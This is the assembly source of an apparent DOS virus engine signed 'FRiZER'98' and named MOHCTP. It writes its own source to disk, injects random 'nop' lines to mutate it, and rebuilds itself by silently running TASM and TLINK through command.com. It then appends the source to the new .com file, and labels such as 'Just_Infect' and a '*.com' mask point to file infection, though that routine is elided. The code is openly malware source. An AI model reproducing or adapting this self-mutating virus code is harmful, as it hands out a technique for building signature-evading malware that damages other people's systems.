;[MOHCTP] by FRiZER'98
.model tiny
.code
.286
.startup
jumps
SrcSize  equ    5590            ; source size
SrcSkip  equ    9               ; strings to skip from begin
org 100h

        mov     ah,2Fh          ; get DTA
        int     21h

        mov     DTA_ofs,bx      ; save DTA
        mov     DTA_seg,es

        push    cs
        pop     es              ; restore es

        lea     dx,DTA          ; set DTA
        mov     ah,1Ah
        int     21h

jmp     skip_check              ;* don't check existing tasm.exe & tlink.exe

        mov     ah,4Eh
        lea     dx,Tasm_n+9     ; find tasm.exe
        mov     cx,20h
        int     21h
        jc      Just_Infect     ; not found - just infect some files

        mov     ah,4Eh
        lea     dx,Tlink_n+9    ; find tlink.exe
        int     21h
        jc      Just_Infect     ; not found - just infect some files

skip_check:                     ;*

        mov     ah,3Ch
        lea     dx,Tasm_n+19    ; create _mutaro_.asm
        mov     cx,20h
        int     21h
        jc      Just_Infect     ; can't create - just infect some files

        xchg    ax,bx

        lea     si,SrcBody
        mov     cx,SrcSize
        lea     di,[si+SrcSize]
        call    UnPack          ; cx - unpacked size
                                ; di - unpacked data

        mov     bp,0            ; bp - writed str counter
FindEnd:
        mov     al,0Ah          ; find end of string
        push    di
        pop     si
        repnz   scasb
        jnz     EndSrc          ; not found - end of source

        push    cx
        mov     dx,si
        mov     cx,di
        sub     cx,si
        call    WritStr         ; write string
        pop     cx

        cmp     byte ptr [di],''; end of source
        je      EndSrc

        inc     bp
        cmp     bp,SrcSkip      ; skip some strings from begin
        jbe     NextStr

        call    Insert_Trash

NextStr:
        jmp     FindEnd

EndSrc:
        mov     ah,3Eh          ; close _mutaro_.asm
        int     21h

        mov     ah,4Ah          ; resize memory
        mov     bx,(offset SrcBody+SrcSize*2+10h+15)
        shr     bx,4
        int     21h

        mov     sp,(offset SrcBody+SrcSize*2+10h)
        push    0

        lea     dx,command
        lea     bx,Tasm_e       ; run tasm.exe
        call    Save&Exec

        lea     dx,command
        lea     bx,Tlink_e      ; run tlink.exe
        call    Save&Exec

        mov     ah,49h          ; free memory
        int     21h

        mov     ah,48h          ; get max free size
        mov     bx,-1
        int     21h

        dec     bx
        mov     ah,48h          ; allocate mem
        int     21h

        mov     ax,3D02h        ; open for r&w
        lea     dx,FileCom      ; _MOHCTP_.com
        int     21h
        xchg    ax,bx

        mov     ax,4202h        ; lseek to end
        xor     cx,cx
        xor     dx,dx
        int     21h

        mov     ah,40h          ; append source to end of .com
        lea     dx,SrcBody
        mov     cx,SrcSize
        int     21h

        mov     ah,3Eh          ; close _MOHCTP_.com
        int     21h

Just_Infect:

;       . . .

        mov     dx,DTA_ofs      ; restore DTA
        mov     ds,DTA_seg
        mov     ah,1Ah
        int     21h
        ret

UnPack  proc
;þ in:  si .... packed data place
;       di .... buffer place
;       cx .... packed data size
;þ out: cx .... unpacked data size
        cld
        push    si di
UnByte: lodsb
        xor     al,0
        stosb
        loop    UnByte
        pop     cx              ; cx - old di
        sub     di,cx           ; di - unpacked size
        xchg    cx,di           ; cx - unpacked size, di - old di
        pop     si              ; si - old si
        ret
UnPack  endp

WritStr proc
;þ in:  dx .... begin str
;       cx .... size str
        push    ax
        mov     ah,40h
        int     21h
        pop     ax
        ret
WritStr endp

Insert_Trash    proc
        push    ax cx dx
GetRnd: in      al,40h          ; al - rnd > 0
        and     al,00000011b    ; from 1 till 3
        jz      GetRnd
        cbw                     ; ah - 0
        xchg    ax,cx           ; cx - 'nop's count
        lea     dx,trash
Insert_Next:
        push    cx
        mov     ah,40h          ; write 'nop'
        mov     cx,5
        int     21h
        pop     cx
        loop    Insert_Next
        pop     dx cx ax
        ret
Insert_Trash    endp

Save&Exec       proc
        push    ds es           ; save ds, es
        mov     _SP,sp
        mov     _SS,ss
        mov     [bx+4],ds
        mov     [bx+8],ds
        mov     [bx+0Ch],ds
        mov     ax,4B00h
        int     21h
        mov     ss,cs:_SS
        mov     sp,cs:_SP
        pop     es ds
        ret
Save&Exec       endp

VName   db      13,10,'[MOHCTP] by FRiZER''98',13,10
command db      'c:\command.com',0
Tasm_e  dw      0,Tasm_n,0,5Ch,0,6Ch,0
Tasm_n  db      32,' nul /c tasm.exe',0,' _MOHCTP_.asm',0,0Dh
Tlink_e dw      0,Tlink_n,0,5Ch,0,6Ch,0
Tlink_n db      36,' nul /c tlink.exe',0,' /t/x _MOHCTP_.obj',0Dh
FileCom db      '_MOHCTP_.com',0
Msk     db      '*.com',0
trash   db      'nop',13,10
DTA     db      2Ch dup (0)
DTA_ofs dw      0
DTA_seg dw      0
_SP     dw      0
_SS     dw      0
SrcBody:end                     ; virus source
